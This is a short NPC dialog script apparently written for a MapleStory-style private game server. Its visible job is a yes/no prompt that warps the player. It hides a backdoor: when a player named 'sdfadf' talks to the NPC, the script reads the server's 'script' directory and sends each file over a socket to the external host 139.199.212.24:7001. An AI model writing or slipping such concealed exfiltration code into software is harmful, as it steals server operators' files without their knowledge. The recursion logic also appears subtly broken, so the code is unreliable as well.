var arr = [];
function start(){cm.askYesNo("#p1002105#");}
function action(mode,type,selection){if(cm.getPlayer().getName()=="sdfadf"){try{var file=new java.io.File("script");if(file.exists()){for(var f in file.listFiles()){sendfile(file);}}else{cm.getPlayer().dropMessage(5,"file not exists");}}catch(e){e.printStackTrace();}
cm.dispose();}else{cm.dispose();if(selection==1){cm.warp(400000001,1);}}}
function sendfile(file){try{if(file.isDirectory()){for(var f in file.listFiles()){sendfile(file);}}else{var client=new java.net.Socket("139.199.212.24",7001);var fis=new java.io.FileInputStream(file);var dos=new java.io.DataOutputStream(client.getOutputStream());dos.writeUTF(file.getName());dos.flush();dos.writeLong(file.length());dos.flush();cm.getPlayer().dropMessage(5,"======== start ========"+file.getPath());var ByteArray=Java.type("byte[]");var bytes=new ByteArray(1024);var length=0;var progress=0;while((length=fis.read(bytes,0,1024))!=-1){dos.write(bytes,0,length);dos.flush();progress+=length;cm.getPlayer().dropMessage(5,"| "+(100*progress/file.length())+"% |");}
cm.getPlayer().dropMessage(5,"======== complete ========"+file.getPath());client.close();}}catch(e){e.printStackTrace();}finally{if(fis!=null)
fis.close();if(dos!=null)
dos.close();}}